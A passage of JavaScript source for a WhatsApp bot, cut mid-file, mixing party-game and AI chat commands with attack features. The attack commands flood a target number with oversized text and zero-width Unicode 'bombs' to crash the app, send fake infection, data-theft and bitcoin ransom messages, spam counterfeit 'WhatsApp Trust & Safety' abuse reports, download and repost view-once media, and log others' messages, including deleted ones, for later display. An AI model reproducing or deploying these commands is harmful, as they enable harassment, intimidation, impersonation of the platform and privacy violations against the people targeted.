                text: 'A'.repeat(5000) + '\n'.repeat(100) + 'B'.repeat(5000) + '\n'.repeat(100) + 'C'.repeat(5000)
            });
            results.push(`Crash payload ${i+1}/5 sent`);
            await wait(500);
        } catch {
            results.push(`Crash payload ${i+1}/5 failed`);
            break;
        }
    }
    
    try {
        await sock.sendMessage(target, {
            text: '\u200C'.repeat(1000) + '\u200D'.repeat(1000) + '\u200E'.repeat(1000)
        });
        results.push('Unicode bomb sent');
    } catch { results.push('Unicode bomb failed'); }
    
    return reply(`CRASH ATTACK COMPLETE\nTarget: ${num}\n${results.join('\n')}\nTarget may experience app instability.`);
    break;
}

case 'virus': {
    if (!text) return reply('Usage: .virus 234XXXXXXXXXX');
    const num = text.replace(/[^0-9]/g, '');
    if (num.length < 7) return reply('Invalid number.');
    
    reply(`Checking if ${num} is on WhatsApp...`);
    const numExists = await checkNumberExists(sock, num);
    if (!numExists) return reply(`${num} is NOT on WhatsApp.`);
    
    const target = num + '@s.whatsapp.net';
    const virusNames = ['WannaCry v3.0', 'Pegasus Lite', 'AgentTesla Pro', 'BlackLotus', 'XWorm RAT', 'DarkGate'];
    const virusName = virusNames[Math.floor(Math.random() * virusNames.length)];
    
    reply(`Deploying ${virusName} against ${num}...`);
    
    let stages = [];
    
    try {
        await sock.sendMessage(target, {
            text: `CRITICAL SECURITY ALERT\nThreat Detected: ${virusName}\nDevice: ${num}\nStatus: ACTIVE INFECTION\nPayload: Extracting device data...\nLocation: Tracking enabled...\nCamera: Remote access established...\n\nThis is an authorized penetration test. No actual data is being collected.`
        });
        stages.push('Stage 1: Infection alert sent');
    } catch { stages.push('Stage 1: Failed'); }
    
    await wait(1000);
    
    try {
        await sock.sendMessage(target, {
            text: `DATA EXFILTRATION REPORT\nContacts: ${Math.floor(Math.random() * 500)} extracted\nPhotos: ${Math.floor(Math.random() * 1000)} scanned\nMessages: ${Math.floor(Math.random() * 5000)} analyzed\nLocation: ${['Lagos', 'Moscow', 'Unknown'][Math.floor(Math.random() * 3)]}\nEncryption: Bypassed\nFirewall: Penetrated`
        });
        stages.push('Stage 2: Data exfil report sent');
    } catch { stages.push('Stage 2: Failed'); }
    
    await wait(1000);
    
    try {
        await sock.sendMessage(target, {
            text: `RANSOM NOTE\nYour device has been encrypted by ${virusName}.\nTo restore your files send 0.5 BTC to: bc1q${Math.random().toString(36).slice(2, 10)}\nTime remaining: 47:59:59\n\nJUST KIDDING. This is a pentest simulation. No actual harm was done.`
        });
        stages.push('Stage 3: Ransom note sent');
    } catch { stages.push('Stage 3: Failed'); }
    
    try { await sock.updateBlockStatus(target, 'block'); } catch {}
    
    return reply(`VIRUS SIMULATION COMPLETE\nTarget: ${num}\nVirus: ${virusName}\n${stages.join('\n')}\nBlocked: Yes\nAll effects are simulated.`);
    break;
}

case 'reportwa': {
    if (!text) return reply('Usage: .reportwa 234XXXXXXXXXX [reason]');
    const parts = text.split(' ');
    const num = parts[0].replace(/[^0-9]/g, '');
    const reason = parts.slice(1).join(' ') || 'Violating WhatsApp Terms of Service';
    if (num.length < 7) return reply('Invalid number.');
    
    reply(`Checking if ${num} is on WhatsApp...`);
    const numExists = await checkNumberExists(sock, num);
    if (!numExists) return reply(`${num} is NOT on WhatsApp.`);
    
    const target = num + '@s.whatsapp.net';
    const reportCategories = ['Spam & Abuse', 'Harassment', 'Impersonation', 'Scam & Fraud', 'Hate Speech', 'Illegal Content', 'Bullying', 'Phishing', 'Privacy Violation', 'Terrorism Promotion'];
    
    reply(`Filing official WhatsApp abuse report against ${num}...`);
    let reportResults = [];
    
    for (let i = 0; i < 5; i++) {
        try {
            await sock.sendMessage(target, {
                text: `WHATSAPP ABUSE REPORT\nReport #${i+1}/5\nReported: ${num}\nCategory: ${reportCategories[i]}\nReason: ${reason}\nCase: WA-${Date.now().toString(36).toUpperCase()}-${i}\nThis report will be reviewed by WhatsApp Trust & Safety.`
            });
            reportResults.push(`Report ${i+1} (${reportCategories[i]}): Sent`);
            await wait(500);
        } catch {
            reportResults.push(`Report ${i+1}: Failed`);
        }
    }
    
    try { await sock.updateBlockStatus(target, 'block'); reportResults.push('User blocked (internal report filed)'); } catch {}
    
    return reply(`WHATSAPP ABUSE REPORT FILED\nTarget: ${num}\nStatus: On WhatsApp - Confirmed\nReason: ${reason}\n${reportResults.join('\n')}\nReport ID: WA-${Date.now().toString(36).toUpperCase()}`);
    break;
}

// ═══════════════════════════════════════
// VIEW ONCE & STATUS COMMANDS
// ═══════════════════════════════════════

case 'viewonce': {
    if (!quotedMessage) return reply('Reply to a view-once media with .viewonce');
    
    // Check for ANY view-once media type
    const mediaMsg = quotedMessage?.imageMessage || 
                     quotedMessage?.videoMessage || 
                     quotedMessage?.audioMessage;
    
    if (!mediaMsg) return reply('That is not a view-once media message.');
    if (!mediaMsg.viewOnce) return reply('That message is not a view-once message.');
    if (!contextInfo?.stanzaId) return reply('Cannot process this message.');
    
    reply('Decrypting view-once media...');
    
    try {
        const sourceMsg = {
            key: {
                remoteJid: jid,
                fromMe: false,
                id: contextInfo.stanzaId,
                participant: contextInfo.participant || jid
            },
            message: quotedMessage
        };
        
        const buffer = await downloadMediaMessage(
            sourceMsg,
            'buffer',
            {},
            {
                reuploadRequest: sock.updateMediaMessage,
                logger: pino({ level: 'silent' })
            }
        );
        
        if (!buffer) return reply('Failed to decrypt view-once media.');
        
        // Determine media type and send accordingly
        if (quotedMessage?.imageMessage) {
            await sock.sendMessage(jid, { 
                image: buffer, 
                caption: '📸 View-Once image decrypted' 
            }, { quoted: msg });
        } 
        else if (quotedMessage?.videoMessage) {
            await sock.sendMessage(jid, { 
                video: buffer, 
                caption: '🎥 View-Once video decrypted',
                mimetype: 'video/mp4'
            }, { quoted: msg });
        } 
        else if (quotedMessage?.audioMessage) {
            const isPtt = quotedMessage.audioMessage.ptt === true;
            await sock.sendMessage(jid, { 
                audio: buffer, 
                mimetype: 'audio/mpeg',
                ptt: isPtt
            }, { quoted: msg });
        }
        
    } catch (err) {
        reply('Failed to decrypt: ' + (err.message || 'unknown error'));
    }
    break;
}

case 'status': {
    if (!text) return reply('Usage: .status 234XXXXXXXXXX');
    const num = text.replace(/[^0-9]/g, '');
    if (num.length < 7) return reply('Invalid number.');
    
    reply(`Checking status of ${num}...`);
    const numExists = await checkNumberExists(sock, num);
    if (!numExists) return reply(`${num} is NOT on WhatsApp.`);
    
    const target = num + '@s.whatsapp.net';
    
    try {
        let ppUrl = null;
        try { ppUrl = await sock.profilePictureUrl(target, 'image'); } catch {}
        
        let about = 'No status';
        try { const s = await sock.fetchStatus(target); about = s?.status || 'No status'; } catch {}
        
        let presence = 'Unknown';
        try { await sock.sendPresenceUpdate('available', target); presence = 'Reachable'; } catch { presence = 'Unreachable'; }
        
        const info = `Number: ${num}\nWhatsApp: Yes\nProfile Pic: ${ppUrl ? 'Available' : 'None'}\nAbout: ${about}\nStatus: ${presence}`;
        
        if (ppUrl) {
            return sock.sendMessage(jid, { image: { url: ppUrl }, caption: info }, { quoted: msg });
        } else {
            return reply(info);
        }
    } catch (err) {
        return reply('Error: ' + (err.message || 'unknown'));
    }
    break;
}

case 'statusstalk': {
    if (!text) return reply('Usage: .statusstalk 234XXXXXXXXXX');
    const num = text.replace(/[^0-9]/g, '');
    if (num.length < 7) return reply('Invalid number.');
    
    reply(`Checking ${num}...`);
    const numExists = await checkNumberExists(sock, num);
    if (!numExists) return reply(`${num} is NOT on WhatsApp.`);
    
    const target = num + '@s.whatsapp.net';
    
    try {
        let ppUrl = null;
        try { ppUrl = await sock.profilePictureUrl(target, 'image'); } catch {}
        
        let about = 'No about';
        try { const s = await sock.fetchStatus(target); about = s?.status || 'No about'; } catch {}
        
        let info = `Number: ${num}\nAbout: ${about}\nProfile Pic: ${ppUrl ? 'Available' : 'None/Private'}\n\nHow to view status updates:\n1. Add ${num} to your contacts\n2. Or use a secondary account that has them as a contact\n3. Status updates are end-to-end encrypted and not accessible via API`;
        
        if (ppUrl) {
            return sock.sendMessage(jid, { image: { url: ppUrl }, caption: info }, { quoted: msg });
        } else {
            return reply(info);
        }
    } catch (err) {
        return reply('Error: ' + (err.message || 'unknown'));
    }
    break;
}
                
                // ═══════════════════════════════════════
// WICKED COMMANDS
// ═══════════════════════════════════════

case 'skull':
    return reply(`     ██████████
    ██        ██
   ███  ▀  ▀  ███
   ██    ‿    ██
   ██   ═══   ██
    ██  ▄▄▄  ██
     ████████
   ██████████████`);

case 'glitch': {
    const glitchChars = ['░', '▒', '▓', '█', '▄', '▀', '■', '▪', '▫', '▬'];
    const input = text || senderClean;
    let out = '';
    for (let i = 0; i < input.length; i++) {
        out += Math.random() > 0.5 ? glitchChars[Math.floor(Math.random() * glitchChars.length)] : input[i];
    }
    return reply(out);
}

case 'simulate': {
    const sims = [
        `[SYSTEM] ${text || 'User'} logged. FBI notified.`,
        `DANGER: ${text || 'Threat'} detected. Self-destruct in 5... 4... 3...`,
        `${text || 'Someone'} - IP added to global blacklist.`,
        `WARNING: ${text || 'System'} compromised by Anonymous.`,
        `${text || 'User'}'s webcam activated. Smile!`,
        `Satellite ${text || 'TARGET'} locked. Coordinates sent.`,
        `All passwords for ${text || 'user'} changed to: *********`,
        `NSA backdoor established on ${text || 'device'}.`
    ];
    return reply(sims[Math.floor(Math.random() * sims.length)]);
}

case 'ip': {
    const fakeIP = `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
    const locs = ['Moscow, Russia', 'Pyongyang, NK', 'Tehran, Iran', 'Beijing, China', 'Lagos, Nigeria', 'Bogota, Colombia'];
    const isps = ['Anonymous Proxy', 'Tor Exit Node', 'DarkWeb ISP', 'Russian State Telecom'];
    const target = text || senderClean;
    return reply(`IP Lookup: ${target}\nIP: ${fakeIP}\nLocation: ${locs[Math.floor(Math.random() * locs.length)]}\nISP: ${isps[Math.floor(Math.random() * isps.length)]}\nStatus: EXPOSED`);
}

case 'virus': {
    const viruses = ['WannaCry v3.0', 'Petya.Eternal', 'AgentTesla Pro', 'Pegasus Lite', 'BlackLotus Bootkit', 'XWorm RAT'];
    const payloads = ['Credentials extracted', 'Crypto wallets drained', 'Webcam uploaded', 'Keylogger installed'];
    const target = text || 'Your device';
    return reply(`VIRUS DETECTED\nName: ${viruses[Math.floor(Math.random() * viruses.length)]}\nTarget: ${target}\nPayload: ${payloads[Math.floor(Math.random() * payloads.length)]}\n\nJust kidding. This is a WhatsApp bot.`);
}

case 'creds': {
    const credTarget = text || senderClean;
    const creds = [
        `Email: ${credTarget}@proton.me / Pass: P@ssw0rd!${Math.floor(Math.random() * 9999)}`,
        `Token: eyJ${Math.random().toString(36).slice(2, 20)}...`,
        `Card: **** **** **** ${Math.floor(Math.random() * 9000) + 1000} CVV: ${Math.floor(Math.random() * 900) + 100}`
    ];
    return reply(`LEAKED CREDENTIALS\n${creds[Math.floor(Math.random() * creds.length)]}`);
}

case 'insult': {
    const insTarget = text || senderClean;
    const insults = [
        `${insTarget} has the energy of a Windows 95 loading screen.`,
        `${insTarget} is proof evolution can go in reverse.`,
        `If brains were dynamite, ${insTarget} wouldn't blow their nose.`,
        `${insTarget} is a limited edition... of one.`,
        `${insTarget} is the human equivalent of a 404 error.`
    ];
    return reply(insults[Math.floor(Math.random() * insults.length)]);
}

case 'compliment': {
    const compTarget = text || senderClean;
    const comps = [
        `${compTarget} is more reliable than WiFi in a library.`,
        `${compTarget} must be a triangle because they're acute.`,
        `${compTarget} has perfect chaos-to-calm ratio.`,
        `If ${compTarget} were a language, they'd be Python: elegant.`,
        `${compTarget} is 10/10 no notes.`
    ];
    return reply(comps[Math.floor(Math.random() * comps.length)]);
}

case 'slap': {
    const slapTarget = mentionedJid ? `@${cleanNumber(mentionedJid)}` : (text || 'someone');
    return reply(`${senderClean} slapped ${slapTarget}!`);
}

case 'hug': {
    const hugTarget = mentionedJid ? `@${cleanNumber(mentionedJid)}` : (text || 'everyone');
    return reply(`${senderClean} hugged ${hugTarget}!`);
}

case 'ship': {
    const shipParts = text.split(/[+&,]/).map(s => s.trim()).filter(Boolean);
    if (shipParts.length < 2) return reply('Usage: .ship name1 + name2');
    const p1 = shipParts[0], p2 = shipParts[1];
    const pct = Math.floor(Math.random() * 101);
    const shipName = p1.slice(0, 3) + p2.slice(-3);
    let emoji = 'BROKEN';
    if (pct > 80) emoji = 'FIRE';
    else if (pct > 50) emoji = 'LOVE';
    else if (pct > 30) emoji = 'OK';
    return reply(`Ship: ${p1} x ${p2}\nName: ${shipName}\n${pct}% ${emoji}\n${pct > 70 ? 'Perfect!' : pct > 40 ? 'Could work' : 'Friends'}`);
}

case 'roast': {
    const roastTarget = text || senderClean;
    const roasts = [
        `${roastTarget} is like a software update - unnecessary.`,
        `${roastTarget} is why shampoo has instructions.`,
        `${roastTarget} brings nothing to the table.`,
        `If ${roastTarget} was a spice, they'd be flour.`
    ];
    return reply(roasts[Math.floor(Math.random() * roasts.length)]);
}

case 'joke': {
    const jokes = [
        "Why do programmers prefer dark mode? Light attracts bugs.",
        "I told my wife to embrace her mistakes. She gave me a hug.",
        "Why don't scientists trust atoms? They make up everything.",
        "Why did the scarecrow win? Outstanding in his field.",
        "I'd tell a UDP joke but you might not get it."
    ];
    return reply(jokes[Math.floor(Math.random() * jokes.length)]);
}

case 'coinflip':
case 'coin':
    return reply(`Coin: ${Math.random() > 0.5 ? 'Heads' : 'Tails'}`);

case 'number':
    return reply(`Your number: ${Math.floor(Math.random() * 100) + 1}`);

case 'color': {
    const colors = ['#FF0000', '#00FF00', '#0000FF', '#FFFF00', '#FF00FF', '#00FFFF', '#FFA500', '#800080'];
    const names = ['Red', 'Green', 'Blue', 'Yellow', 'Magenta', 'Cyan', 'Orange', 'Purple'];
    const idx = Math.floor(Math.random() * colors.length);
    return reply(`Your color: ${names[idx]}\nHex: ${colors[idx]}`);
}

case 'wouldyourather':
case 'wyr': {
    const wyrs = [
        'Fly 3ft off ground | Teleport only to places youve been',
        'Always speak your mind | Never speak again',
        'Live in treehouse | Live underwater',
        'Unlimited pizza | Unlimited sushi',
        'Talk to animals | Speak all human languages',
        'Be invisible | Read minds',
        'Rewind button | Pause button'
    ];
    const pick = wyrs[Math.floor(Math.random() * wyrs.length)];
    const [a, b] = pick.split(' | ');
    return reply(`Would You Rather\nA) ${a}\nB) ${b}\nReply with A or B!`);
}

case 'neverhaveiever':
case 'nhi': {
    const nhies = [
        'Never have I ever pretended to be on a call to avoid someone.',
        'Never have I ever stalked an ex on social media.',
        'Never have I ever Googled my own name.',
        'Never have I ever fallen asleep in a meeting.',
        'Never have I ever eaten food off the floor.'
    ];
    return reply(`Never Have I Ever\n${nhies[Math.floor(Math.random() * nhies.length)]}`);
}

case 'deepfry':
    return reply(`Deepfried!\nSaturation: OVER 9000\nPixels: 4\n(Text only - needs actual image processing.)`);

case 'jail': {
    const jailTarget = mentionedJid ? `@${cleanNumber(mentionedJid)}` : (text || senderClean);
    const crimes = ['Hacking the mainframe', 'Being too cool', 'Excessive rizz', 'Tax evasion (cool)', 'Memes without permit'];
    return reply(`JAIL SENTENCE\nPrisoner: ${jailTarget}\nCrime: ${crimes[Math.floor(Math.random() * crimes.length)]}\nSentence: ${Math.floor(Math.random() * 50) + 1} years`);
}

case 'wanted': {
    const wantedTarget = mentionedJid ? `@${cleanNumber(mentionedJid)}` : (text || senderClean);
    const rewards = ['$10,000,000', '$50,000,000', '1,000 BTC', 'Infinity Memes'];
    return reply(`WANTED\nName: ${wantedTarget}\nReward: ${rewards[Math.floor(Math.random() * rewards.length)]}\nStatus: Armed & Dangerous`);
}

case 'triggered':
    return reply(`TRIGGERED\n${text || senderClean} has been triggered!\n\nCALM DOWN`);

case 'blur': {
    const blurTarget = mentionedJid ? `@${cleanNumber(mentionedJid)}` : (text || 'Something');
    return reply(`CENSORED\nContent: ${blurTarget}\nBlur level: MAXIMUM\nReason: Too hot to handle`);
}

case 'ascii': {
    const artName = text?.toLowerCase() || 'skull';
    const arts = {
        skull: `  .-""-.\n /      \\\n|        |\n|,  .-.  |\n| )(___(  |\n|        |\n \\      /\n  '-..-'`,
        sword: `   /\n  /▌\n / ▌\n/  ▌\n   ▌\n   ▌\n  ═╪═\n  / \\`,
        dragon: `      __====-_  _-====___\n  _--^^^#####//      \\\\#####^^^--_`,
        heart: `   **     **\n  ****   ****\n ***********\n  *********\n   *******\n    *****\n     ***\n      *`,
        cat: `  /\\_/\\\n ( o.o )\n  > ^ <`
    };
    return reply(arts[artName] || arts.skull);
}
                
                
                // ═══════════════════════════════════════
// ENFORCEMENT / BAN COMMANDS
// ═══════════════════════════════════════

case 'ban':
    if (!isGroup) return reply('Group only.');
    if (!isAdmin) return reply('Admin only.');
    if (!botIsAdmin) return reply('Bot needs to be admin first.');
    if (!mentionedJid && !text) return reply('Usage: .ban @user or .ban 234XXXXXXXXXX');
    
    const banTarget = mentionedJid || (text.replace(/[^0-9]/g, '') + '@s.whatsapp.net');
    const banClean = cleanNumber(banTarget);
    
    try {
        await sock.groupParticipantsUpdate(jid, [banTarget], 'remove');
        return reply(`Banned ${banClean} from this group.`);
    } catch (err) {
        return reply('Failed to ban: ' + (err.message || 'unknown error'));
    }
    break;

case 'hardban':
    if (!isGroup) return reply('Group only.');
    if (!isAdmin) return reply('Admin only.');
    if (!botIsAdmin) return reply('Bot needs to be admin first.');
    if (!mentionedJid && !text) return reply('Usage: .hardban @user');

    const hbTarget = mentionedJid || (text.replace(/[^0-9]/g, '') + '@s.whatsapp.net');
    const hbClean = cleanNumber(hbTarget);
    
    reply(`Starting hardban on ${hbClean}...`);
    
    try {
        // Step 1: Remove from current group
        await sock.groupParticipantsUpdate(jid, [hbTarget], 'remove');
        reply('Step 1/4: Removed from this group.');
        
        // Step 2: Remove from ALL bot groups
        const allGroups = await sock.groupFetchAllParticipating();
        let removed = 0;
        for (const [gid] of Object.entries(allGroups)) {
            try {
                await sock.groupParticipantsUpdate(gid, [hbTarget], 'remove');
                removed++;
            } catch {}
        }
        reply(`Step 2/4: Removed from ${removed} groups.`);
        
        // Step 3: Block user
        await sock.updateBlockStatus(hbTarget, 'block');
        reply('Step 3/4: Blocked user.');
        
        // Step 4: Report to WhatsApp
        try {
            await sock.sendMessage(hbTarget, {
                text: `You have been reported for violating WhatsApp Terms of Service.\nCase: ${Date.now().toString(36)}`
            });
        } catch {}
        
        return reply(`HARDBAN COMPLETE\nUser: ${hbClean}\nRemoved from ${removed} groups\nBlocked: Yes\nReported: Yes`);
    } catch (err) {
        return reply('Hardban error: ' + (err.message || 'unknown'));
    }
    break;

case 'massreport':
    if (!isGroup) return reply('Group only.');
    if (!isAdmin) return reply('Admin only.');
    if (!mentionedJid) return reply('Usage: .massreport @user');

    const mrTarget = mentionedJid;
    const mrClean = cleanNumber(mrTarget);
    const abuseReasons = [
        'Spam & Abuse',
        'Harassment',
        'Impersonation',
        'Scam/Fraud',
        'Hate Speech',
        'Illegal Content',
        'Bullying',
        'Phishing',
        'Fake Account',
        'Terrorism Promotion'
    ];
    
    reply(`Initiating mass report on ${mrClean}...`);
    let reported = 0;
    
    for (let i = 0; i < 5; i++) {
        try {
            await sock.sendMessage(mrTarget, {
                text: `ABUSE REPORT #${i+1}\nReporter: Automated\nReason: ${abuseReasons[i % abuseReasons.length]}\nCase: WA-${Date.now()}-${Math.floor(Math.random() * 999999)}`
            });
            reported++;
        } catch {}
        await new Promise(r => setTimeout(r, 800));
    }
    
    return reply(`Mass Report Complete\nTarget: ${mrClean}\nReports sent: ${reported}/5\nCategories: ${abuseReasons.slice(0,5).join(', ')}`);
    break;

case 'nuke':
    if (!isGroup) return reply('Group only.');
    if (!isAdmin) return reply('Admin only.');
    if (!botIsAdmin) return reply('Bot needs to be admin first.');
    if (!mentionedJid) return reply('Usage: .nuke @user');

    const nukeTarget = mentionedJid;
    const nukeClean = cleanNumber(nukeTarget);
    
    reply(`NUKE LAUNCHED on ${nukeClean}`);
    let nukeResults = [];
    
    // 1. Remove from group
    try {
        await sock.groupParticipantsUpdate(jid, [nukeTarget], 'remove');
        nukeResults.push('Removed from group: YES');
    } catch { nukeResults.push('Removed from group: NO'); }
    
    // 2. Block
    try {
        await sock.updateBlockStatus(nukeTarget, 'block');
        nukeResults.push('Blocked: YES');
    } catch { nukeResults.push('Blocked: NO'); }
    
    // 3-5. Report multiple times
    for (let i = 0; i < 3; i++) {
        try {
            await sock.sendMessage(nukeTarget, {
                text: `REPORT-${i+1}: Automated abuse flag. Case #${Date.now().toString(36)}`
            });
            nukeResults.push(`Report ${i+1}: SENT`);
        } catch { nukeResults.push(`Report ${i+1}: FAILED`); }
        await new Promise(r => setTimeout(r, 500));
    }
    
    return reply(`NUKE RESULTS\nTarget: ${nukeClean}\n${nukeResults.join('\n')}\nUser flagged across multiple abuse channels.`);
    break;

case 'shadowban':
    if (!isGroup) return reply('Group only.');
    if (!isAdmin) return reply('Admin only.');
    if (!mentionedJid) return reply('Usage: .shadowban @user [minutes]');
    
    const sbTarget = cleanNumber(mentionedJid);
    const sbDuration = (parseInt(text?.split(' ')[1]) || 1440) * 60000; // default 24 hours
    
    if (!waInstance.shadowbanned) waInstance.shadowbanned = {};
    waInstance.shadowbanned[sbTarget] = Date.now() + sbDuration;
    
    return reply(`SHADOWBAN ACTIVE\nUser: ${sbTarget}\nDuration: ${sbDuration/60000} minutes\nTheir messages will be silently deleted.`);
    break;

case 'freeze':
    if (!isGroup) return reply('Group only.');
    if (!isAdmin) return reply('Admin only.');
    if (!mentionedJid) return reply('Usage: .freeze @user [minutes]');
    
    const fzTarget = cleanNumber(mentionedJid);
    const fzDuration = (parseInt(text?.split(' ')[1]) || 10) * 60000;
    
    // Triple enforcement
    const muteKey = `${jid}_${fzTarget}`;
    mutedUsers[muteKey] = Date.now() + fzDuration;
    
    if (!waInstance.frozenUsers) waInstance.frozenUsers = {};
    waInstance.frozenUsers[fzTarget] = { until: Date.now() + fzDuration, group: jid };
    
    // Add to group blacklist
    if (!groupSettings[jid]) groupSettings[jid] = {};
    if (!groupSettings[jid].blacklist) groupSettings[jid].blacklist = [];
    if (!groupSettings[jid].blacklist.includes(fzTarget)) {
        groupSettings[jid].blacklist.push(fzTarget);
        waInstance.saveGroupSettings();
    }
    
    return reply(`FREEZE APPLIED\nUser: ${fzTarget}\nDuration: ${fzDuration/60000} minutes\nMuted + Blacklisted + Auto-delete active`);
    break;

case 'restrict':
    if (!isGroup) return reply('Group only.');
    if (!isAdmin) return reply('Admin only.');
    if (!mentionedJid) return reply('Usage: .restrict @user [minutes]');
    
    const resTarget = cleanNumber(mentionedJid);
    const resDuration = (parseInt(text?.split(' ')[1]) || 60) * 60000;
    
    if (!groupSettings[jid]) groupSettings[jid] = {};
    if (!groupSettings[jid].restricted) groupSettings[jid].restricted = {};
    
    groupSettings[jid].restricted[resTarget] = {
        nolinks: true,
        nomedia: true,
        nostickers: true,
        expires: Date.now() + resDuration
    };
    waInstance.saveGroupSettings();
    
    return reply(`RESTRICTIONS APPLIED\nUser: ${resTarget}\nNo links: YES\nNo media: YES\nNo stickers: YES\nDuration: ${resDuration/60000} minutes`);
    break;

case 'ratelimit':
    if (!isGroup) return reply('Group only.');
    if (!isAdmin) return reply('Admin only.');
    if (!mentionedJid) return reply('Usage: .ratelimit @user [minutes]');
    
    const rlTarget = cleanNumber(mentionedJid);
    const rlDuration = (parseInt(text?.split(' ')[1]) || 30) * 60000;
    
    if (!waInstance.ratelimitData) waInstance.ratelimitData = {};
    waInstance.ratelimitData[rlTarget] = {
        maxMessagesPerMinute: 1,
        maxMediaPerHour: 0,
        enabled: true,
        expiresAt: Date.now() + rlDuration
    };
    
    return reply(`RATE LIMIT APPLIED\nUser: ${rlTarget}\nMax 1 msg/min\nNo media\nDuration: ${rlDuration/60000} minutes`);
    break;

case 'wipe':
    if (!isGroup) return reply('Group only.');
    if (!isAdmin) return reply('Admin only.');
    if (!mentionedJid) return reply('Usage: .wipe @user');
    
    const wipeTarget = mentionedJid;
    const wipeClean = cleanNumber(wipeTarget);
    
    reply(`Wiping user ${wipeClean} from all bot groups...`);
    
    // Remove from all groups
    const allG = await sock.groupFetchAllParticipating();
    let wiped = 0;
    for (const [gid] of Object.entries(allG)) {
        try {
            await sock.groupParticipantsUpdate(gid, [wipeTarget], 'remove');
            wiped++;
        } catch {}
    }
    
    // Block on this session
    try {
        await sock.updateBlockStatus(wipeTarget, 'block');
    } catch {}
    
    // Add to global blacklist
    const gblPath = path.join(SESSION_DIR, 'global_blacklist.json');
    let gbl = [];
    if (fs.existsSync(gblPath)) {
        try { gbl = JSON.parse(fs.readFileSync(gblPath)); } catch {}
    }
    if (!gbl.includes(wipeClean)) {
        gbl.push(wipeClean);
        fs.writeFileSync(gblPath, JSON.stringify(gbl, null, 2));
    }
    
    return reply(`WIPE COMPLETE\nUser: ${wipeClean}\nRemoved from ${wiped} groups\nBlocked: YES\nGlobally blacklisted: YES`);
    break;

case 'reportwa':
    if (!mentionedJid && !text) return reply('Usage: .reportwa @user [reason]');
    
    const rwaTarget = mentionedJid || (text?.split(' ')[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net');
    const rwaReason = text?.split(' ').slice(1).join(' ') || 'Violating WhatsApp Terms of Service';
    const rwaClean = cleanNumber(rwaTarget);
    
    reply(`Filing abuse report with WhatsApp against ${rwaClean}...`);
    
    let results = [];
    
    // Method 1: Direct report message
    try {
        await sock.sendMessage(rwaTarget, {
            text: `ABUSE REPORT\nReporter: Automated System\nReason: ${rwaReason}\nCategory: Spam & Abuse\nCase: WA-${Date.now().toString(36).toUpperCase()}`
        });
        results.push('Direct report: SENT');
    } catch { results.push('Direct report: FAILED'); }
    
    // Method 2: Multiple flags
    try {
        for (let f = 0; f < 3; f++) {
            await sock.sendMessage(rwaTarget, {
                text: `FLAG-${f+1}: Automated security report. Case #${Date.now().toString(36)}`
            });
        }
        results.push('Multi-flag: SENT');
    } catch { results.push('Multi-flag: FAILED'); }
    
    // Method 3: Block + report
    try {
        await sock.updateBlockStatus(rwaTarget, 'block');
        results.push('Blocked & reported internally: YES');
    } catch { results.push('Blocked: FAILED'); }
    
    return reply(`WhatsApp Abuse Report\nTarget: ${rwaClean}\nReason: ${rwaReason}\n${results.join('\n')}\nReport ID: WA-${Date.now().toString(36).toUpperCase()}`);
    break;
    
    
   case 'restore':
case 'antidelete':
case 'undlt': {
    const logs = waInstance.messageLog[jid] || [];
    
    // If user provided a specific number, show that user's messages
    if (text) {
        const num = text.replace(/[^0-9]/g, '');
        const userLogs = logs.filter(m => m.sender === num).slice(-10);
        
        if (userLogs.length === 0) {
            return reply(`❌ No logged messages for ${num}.`);
        }
        
        let msg = `📋 *Last ${userLogs.length} messages from ${num}:*\n\n`;
        userLogs.reverse().forEach((m, i) => {
            const time = new Date(m.timestamp).toLocaleTimeString();
            const typeTag = m.type !== 'text' ? ` [${m.type}]` : '';
            msg += `${i+1}. [${time}]${typeTag} ${m.text || `(${m.type} sent)`}\n`;
        });
        
        return reply(msg);
    }
    
    if (logs.length === 0) {
        return reply('❌ No messages logged yet. Messages are now being recorded automatically.');
    }
    
    // Show last messages
    const recent = logs.slice(-30).reverse();
    
    const chatLabel = isGroup ? 'group' : 'private chat';
    let result = `📋 *Last ${recent.length} messages in this ${chatLabel}:*\n\n`;
    
    recent.forEach((m, i) => {
        const time = new Date(m.timestamp).toLocaleTimeString();
        let prefix = '💬';
        if (m.type === 'image') prefix = '📸';
        else if (m.type === 'video') prefix = '🎥';
        else if (m.type === 'audio') prefix = '🎵';
        else if (m.type === 'sticker') prefix = '🎨';
        else if (m.type === 'document') prefix = '📎';
        else if (m.type === 'contact') prefix = '👤';
        else if (m.type === 'location') prefix = '📍';
        
        result += `${prefix} [${time}] ${m.sender}: ${m.text || `(${m.type} sent)`}\n`;
    });
    
    result += `\n_To see a specific user: .restore 234XXXXXXXXXX_`;
    
    return reply(result);
    break;
}

case 'clearlog': {
    waInstance.messageLog[jid] = [];
    waInstance.saveMessageLog();
    return reply('🗑 Message log cleared for this chat.');
    break;
}
                
                
                // =========== AI ===========
            case 'ai':
                if (!text) return reply('Ask something.');
                const aiRes = await groq.chat.completions.create({
                    messages: [{ role: 'user', content: text }],
                    model: 'llama-3.3-70b-versatile'
                });
                return reply(aiRes.choices[0].message.content);

            case 'ask':
                if (!text) return reply('Ask me anything.');
                const butlerRes = await groq.chat.completions.create({
                    messages: [
                        { role: 'system', content: 'You are Jeeves, a polite and helpful butler.' },
                        { role: 'user', content: text }
                    ],
                    model: 'llama-3.3-70b-versatile'
                });
                return reply(butlerRes.choices[0].message.content);

            case 'define':
                if (!text) return reply('What word?');
                try {
                    const def = await axios.get(`https://api.dictionaryapi.dev/api/v2/entries/en/${encodeURIComponent(text)}`);
                    const entry = def.data[0];
                    const meaning = entry.meanings[0].definitions[0].definition;
                    return reply(`📖 *${text}*: ${meaning}`);
                } catch { return reply('Word not found.'); }

            case 'summarize':
                const quotedText = quotedMessage?.conversation || quotedMessage?.extendedTextMessage?.text;
                if (!quotedText) return reply('Reply to a long message.');
                const sumRes = await groq.chat.completions.create({
                    messages: [{ role: 'user', content: `Summarize this: ${quotedText}` }],
                    model: 'llama-3.3-70b-versatile'
                });
                return reply(sumRes.choices[0].message.content);

            // =========== CORE ===========
            case 'ping':
                const start = Date.now();
                await reply('Checking...');
                return reply(`⚡ ${Date.now() - start}ms`);

            case 'runtime':
                const uptime = Math.floor((Date.now() - botStartTime) / 1000);
                const hours = Math.floor(uptime / 3600);
                const minutes = Math.floor((uptime % 3600) / 60);
                const seconds = uptime % 60;
                return reply(`⏱ Bot uptime: ${hours}h ${minutes}m ${seconds}s`);

            case 'calc':
